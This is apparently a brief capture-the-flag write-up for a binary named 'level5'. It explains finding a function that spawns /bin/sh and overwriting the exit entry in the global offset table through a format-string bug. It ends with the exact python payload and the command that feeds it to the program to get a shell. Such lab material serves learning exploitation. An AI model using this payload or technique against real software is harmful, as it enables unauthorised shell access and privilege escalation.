With objdump -t we can see a "o" function. This function call /bin/sh.
Like in the last exercise we use format string exploit to redirect the return value of the exit 
function present in the global offset table to the address of the "o" function.

objdump -R to get the got address of exit.

We split the address of exit (0x080484a4):
0804 = 2052 (in decimal) - 8 (because we already wrote 8 bytes with addresses)
84a4 = 33956 (in decimal) - 2052 = 31904

$> python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"' > /tmp/exploit
$> cat /tmp/exploit - | ./level5
